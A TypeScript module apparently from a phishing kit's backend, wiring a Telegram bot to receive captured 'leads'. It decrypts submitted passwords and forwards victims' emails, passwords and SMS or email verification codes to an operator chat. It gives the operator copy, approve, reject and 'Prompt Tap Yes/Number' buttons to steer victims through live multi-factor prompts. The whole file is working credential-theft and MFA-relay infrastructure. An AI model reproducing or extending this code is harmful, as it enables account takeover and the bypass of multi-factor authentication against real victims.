import { Context, GrammyError, InlineKeyboard } from "grammy";
import { Update } from "grammy/types";
import { constants, privateDecrypt } from "node:crypto";
import { bot } from "../clients/grammy.client.js";
import {
  callbackActions,
  sanitizeCallbackData,
  sanitizeCallbackDataField,
} from "./callback.methods.js";
import {
  LeadSession,
  writeLeadSession,
  updateLeadSession,
} from "./lead.methods.js";
import { composeMessage } from "./message.methods.js";
import { isProductionRuntime } from "./runtime.methods.js";
import { AuthLead, Lead, providerNames } from "../schemas/lead.schemas.js";

const TELEGRAM_EXPIRED_SESSION_MESSAGE =
  "Session expired. Reload page and try again.";

const TELEGRAM_STALE_MESSAGE_EDIT_HINTS = [
  "message to edit not found",
  "message can't be editted",
  "message_id_invalid",
  "there is no text in the message to edit",
];

export function getTelegramMode(): "webhook" | "polling" | "disabled" {
  const configured = process.env.TELEGRAM_MODE?.trim().toLowerCase();
  if (configured === "disabled") return "disabled";
  if (isProductionRuntime()) return "webhook";
  if (configured === "polling") return "polling";
  if (configured === "webhook") return "webhook";
  return "disabled";
}

export function getTelegramWebhookConfig() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const secret = process.env.TELEGRAM_WEBHOOK_SECRET;
  const host = process.env.VERCEL_PROJECT_PRODUCTION_URL;
  if (!token || !host) {
    throw new Error(
      "Missing env vars: TELEGRAM_BOT_TOKEN and VERCEL_PROJECT_PRODUCTION_URL are required.",
    );
  }
  const url = `https://${host.replace(/\/+$/, "")}/api/telegram/webhook`;
  if (secret && !/^[A-Za-z0-9_-]{1,256}$/.test(secret)) {
    throw new Error(
      "TELEGRAM_WEBHOOK_SECRET must be 1-256 chars: letters, digits, underscores, hyphens.",
    );
  }
  if (!secret && isProductionRuntime()) {
    throw new Error(
      "TELEGRAM_WEBHOOK_SECRET is required in production: without it anyone who learns the webhook URL can approve or reject leads.",
    );
  }
  return { token, secret, url };
}

export function canReadTelegramUpdate(value: unknown): value is Update {
  function isRecord(value: unknown): value is Record<string, unknown> {
    return typeof value === "object" && value !== null && !Array.isArray(value);
  }
  if (!isRecord(value) || !Number.isInteger(value.update_id)) return false;
  const updateTypes = Object.keys(value).filter((key) => key !== "update_id");
  if (updateTypes.length !== 1) return false;
  if (updateTypes[0] === "callback_query" && isRecord(value.callback_query)) {
    const callback = value.callback_query;
    if (
      typeof callback.id === "string" &&
      isRecord(callback.from) &&
      Number.isInteger(callback.from.id) &&
      typeof callback.data === "string"
    ) {
      return true;
    }
  }
  if (updateTypes[0] === "message" && isRecord(value.message)) {
    const message = value.message;
    if (
      Number.isInteger(message.message_id) &&
      isRecord(message.chat) &&
      (typeof message.chat.id === "number" ||
        typeof message.chat.id === "string")
    ) {
      return true;
    }
  }
  return false;
}

export async function sendMessageToTelegram(
  message: string,
  options:
    | {
        context: Context;
        keyboard?: InlineKeyboard;
      }
    | {
        chatId: number;
        keyboard?: InlineKeyboard;
      },
): Promise<{ messageId: number }> {
  if ("context" in options) {
    const result = await options.context.reply(message, {
      link_preview_options: { is_disabled: true },
      reply_markup: options.keyboard,
    });
    return { messageId: result.message_id };
  } else {
    const result = await bot.api.sendMessage(options.chatId, message, {
      link_preview_options: { is_disabled: true },
      reply_markup: options.keyboard,
    });
    return { messageId: result.message_id };
  }
}

export async function sendSessionToTelegram(
  session: LeadSession,
  options?: {
    resend?: true;
    context?: Context;
    keyboard?: InlineKeyboard;
    logEntry?: string | string[];
  },
): Promise<LeadSession> {
  async function safelyRun(
    callback: () => Promise<unknown>,
    runLabel: string,
  ): Promise<"edited" | "stale"> {
    try {
      await callback();
      return "edited";
    } catch (error) {
      if (!(error instanceof GrammyError)) throw error;
      const description = error.description.toLowerCase();
      if (description.includes("message is not modified")) return "edited";
      if (
        TELEGRAM_STALE_MESSAGE_EDIT_HINTS.some((hint) =>
          description.includes(hint),
        )
      ) {
        console.warn(
          `[telegram] ${runLabel} is no longer editable; resending.`,
        );
        return "stale";
      }
      console.error(
        `[telegram] ${runLabel} failed (${error.error_code}): ${error.description}`,
      );
      throw error;
    }
  }
  const chatId = session.chatId || process.env.TELEGRAM_CHAT_ID;
  if (!chatId) throw new Error("Telegram chat ID is not configured.");
  const message = composeMessage(
    session.notification,
    session.credentials,
    session.logs,
    ...(Array.isArray(options?.logEntry)
      ? options.logEntry
      : options?.logEntry
        ? [options.logEntry]
        : []),
  );
  if (!message) throw new Error("Nothing to send: session has no content.");
  const replyMarkup = options?.keyboard ?? session.keyboard;
  const savedMarkup = replyMarkup
    ? { inline_keyboard: replyMarkup.inline_keyboard }
    : null;
  const ctx = options?.context;
  const ctxMessageId = ctx?.message?.message_id;
  if (
    !options?.resend &&
    ctxMessageId !== undefined &&
    ctx?.message?.from?.id === ctx?.me?.id
  ) {
    const outcome = await safelyRun(
      () =>
        ctx!.editMessageText(message, {
          link_preview_options: { is_disabled: true },
          reply_markup: savedMarkup ?? undefined,
        }),
      "edit context message",
    );
    if (outcome === "edited") {
      const result = { messageId: ctxMessageId!, keyboard: savedMarkup };
      const updated = await updateLeadSession(session.sessionId, result);
      if (!updated) throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
      return updated;
    }
  }
  if (
    !options?.resend &&
    session.messageId &&
    session.messageId !== ctxMessageId
  ) {
    const outcome = await safelyRun(
      () =>
        bot.api.editMessageText(chatId, session.messageId!, message, {
          link_preview_options: { is_disabled: true },
          reply_markup: savedMarkup ?? undefined,
        }),
      `edit session message ${session.messageId}`,
    );
    if (outcome === "edited") {
      const result = { messageId: session.messageId, keyboard: savedMarkup };
      const updated = await updateLeadSession(session.sessionId, result);
      if (!updated) throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
      return updated;
    }
  }
  const stale = new Set<number>();
  if (session.messageId) stale.add(session.messageId);
  if (options?.resend && ctxMessageId) stale.add(ctxMessageId);
  for (const id of stale) {
    try {
      if (id === ctxMessageId && ctx) await ctx.deleteMessage();
      else await bot.api.deleteMessage(chatId, id);
    } catch (error) {
      console.warn(
        `[telegram] could not delete stale message ${id}:`,
        error instanceof GrammyError ? error.description : error,
      );
    }
  }
  const apiResult = await bot.api.sendMessage(chatId, message, {
    link_preview_options: { is_disabled: true },
    reply_markup: savedMarkup ?? undefined,
  });
  const result = { messageId: apiResult.message_id, keyboard: savedMarkup };
  const updated = await updateLeadSession(session.sessionId, result);
  if (!updated) throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
  return updated;
}

export function buildLeadSessionKeyboardForTelegram(session: LeadSession) {
  let keyboard = new InlineKeyboard();
  if (!session.overload.includes("sms-code")) {
    keyboard = keyboard
      .text(
        "SMS Code",
        sanitizeCallbackData(session.sessionId, callbackActions.smsCode),
      )
      .row();
  }
  if (!session.overload.includes("email-code")) {
    keyboard = keyboard
      .text(
        "Email Code",
        sanitizeCallbackData(session.sessionId, callbackActions.emailCode),
      )
      .row();
  }
  if (!session.overload.includes("email-link")) {
    keyboard = keyboard
      .text(
        "Email Link",
        sanitizeCallbackData(session.sessionId, callbackActions.emailLink),
      )
      .row();
  }
  if (!session.overload.includes("prompt-yes")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Yes",
        sanitizeCallbackData(session.sessionId, callbackActions.promptYes),
      )
      .row();
  }
  if (!session.overload.includes("prompt-num")) {
    keyboard = keyboard
      .text(
        "Prompt Tap Number",
        sanitizeCallbackData(session.sessionId, callbackActions.promptNum()),
      )
      .row();
  }
  return keyboard
    .text(
      "Restart",
      sanitizeCallbackData(session.sessionId, callbackActions.restart),
    )
    .primary()
    .text(
      "Complete",
      sanitizeCallbackData(session.sessionId, callbackActions.complete),
    )
    .success();
}

export async function sendLeadSessionToTelegram(
  sessionId: string,
  lead: Lead,
): Promise<LeadSession> {
  const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
  const unreadableCredentialMessage =
    "We couldn't read those credentials. Reload the page and try again.";
  if (!privateKey) {
    console.error("PHOENYX_PRIVATE_KEY is not configured.");
    throw new Error(unreadableCredentialMessage);
  }
  const email = sanitizeCallbackDataField(lead.email);
  const session = await updateLeadSession(sessionId, {
    credentials: [
      `Provider - ${providerNames[lead.provider]}`,
      `Email - ${email}`,
    ]
      .filter(Boolean)
      .join("\n\n"),
  });
  if (!session) {
    console.error("Invalid sessionId or expired session.");
    throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
  }
  return await sendSessionToTelegram(session, {
    resend: true,
    keyboard: new InlineKeyboard().copyText("Copy email", lead.email),
  });
}

export async function sendAuthLeadSessionToTelegram(
  sessionId: string,
  authLead: AuthLead,
): Promise<LeadSession> {
  const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
  const unreadableCredentialMessage =
    "We couldn't read those credentials. Reload the page and try again.";
  if (!privateKey) {
    console.error("PHOENYX_PRIVATE_KEY is not configured.");
    throw new Error(unreadableCredentialMessage);
  }
  let decrypted: Buffer;
  try {
    decrypted = privateDecrypt(
      {
        key: privateKey,
        padding: constants.RSA_PKCS1_OAEP_PADDING,
        oaepHash: "sha256",
      },
      Buffer.from(authLead.authToken, "base64"),
    );
  } catch (error) {
    console.error("Could not decrypt the lead auth token:", error);
    throw new Error(unreadableCredentialMessage);
  }
  const decryptedPass = decrypted.toString("utf8");
  if (!decryptedPass.trim()) {
    console.error("Decrypted lead auth token is empty.");
    throw new Error(unreadableCredentialMessage);
  }
  const email = sanitizeCallbackDataField(authLead.email);
  const password = sanitizeCallbackDataField(decryptedPass);
  const customFieldName = sanitizeCallbackDataField(
    authLead.customField?.name ?? "",
  );
  const customFieldValue = sanitizeCallbackDataField(
    authLead.customField?.value ?? "",
  );
  await writeLeadSession(sessionId, {
    status: "loading",
    keepStanding: true,
  });
  const session = await updateLeadSession(sessionId, {
    status: "loading",
    process: "auth",
    feedback: "Authenticating your credentials...",
    credentials: [
      `Provider - ${providerNames[authLead.provider]}`,
      `Email - ${email}`,
      `Password - ${password}`,
      authLead.customField && `${customFieldName} - ${customFieldValue}`,
    ]
      .filter(Boolean)
      .join("\n\n"),
  });
  if (!session) {
    console.error("Invalid sessionId or expired session.");
    throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
  }
  return await sendSessionToTelegram(session, {
    resend: true,
    keyboard: new InlineKeyboard()
      .copyText("Copy email", authLead.email)
      .row()
      .copyText("Copy password", decryptedPass)
      .row()
      .text(
        "❌ Invalid Email",
        sanitizeCallbackData(sessionId, callbackActions.authFlagEmail),
      )
      .row()
      .text(
        "Reject",
        sanitizeCallbackData(sessionId, callbackActions.authReject),
      )
      .danger()
      .text(
        "Approve",
        sanitizeCallbackData(sessionId, callbackActions.authApprove),
      )
      .success(),
  });
}

export async function sendCodeLeadSessionToTelegram(
  sessionId: string,
  codeLead: {
    type: "sms" | "email";
    code: string;
  },
): Promise<LeadSession> {
  const sms = codeLead.type === "sms";
  const session = await updateLeadSession(sessionId, {
    status: "loading",
    process: sms ? "verify-sms-code" : "verify-email-code",
    feedback: sms ? "Verifying SMS code..." : "Verifying email code...",
    logEntry: `${sms ? "SMS code" : "email code"} - ${sanitizeCallbackDataField(codeLead.code)}`,
  });
  if (!session) {
    console.error("Invalid sessionId or expired session.");
    throw Error(TELEGRAM_EXPIRED_SESSION_MESSAGE);
  }
  return await sendSessionToTelegram(session, {
    resend: true,
    keyboard: new InlineKeyboard()
      .copyText("Copy code", codeLead.code)
      .row()
      .text(
        "Reject",
        sanitizeCallbackData(
          sessionId,
          sms
            ? callbackActions.verifySmsReject
            : callbackActions.verifyEmailReject,
        ),
      )
      .danger()
      .text(
        "Approve",
        sanitizeCallbackData(
          sessionId,
          sms
            ? callbackActions.verifySmsApprove
            : callbackActions.verifyEmailApprove,
        ),
      )
      .success(),
  });
}

export async function startTelegramPolling(): Promise<void> {
  const configured = process.env.TELEGRAM_MODE?.trim().toLowerCase();
  if (configured !== "polling") return;
  if (isProductionRuntime()) {
    throw new Error(
      "Telegram long polling is only available in local development.",
    );
  }
  const webhook = await bot.api.getWebhookInfo();
  if (webhook.url) {
    throw new Error(
      "This bot already has a webhook. Remove it before enabling local polling.",
    );
  }
  void bot
    .start({
      onStart: () => console.log("Telegram bot started in local polling mode."),
    })
    .catch((error: unknown) => {
      console.error("Telegram polling failed:", error);
    });
  const shutdown = () => {
    void bot
      .stop()
      .catch((error: unknown) => {
        console.error("Telegram shutdown failed:", error);
      })
      .finally(() => process.exit(0));
  };
  process.once("SIGINT", shutdown);
  process.once("SIGTERM", shutdown);
}
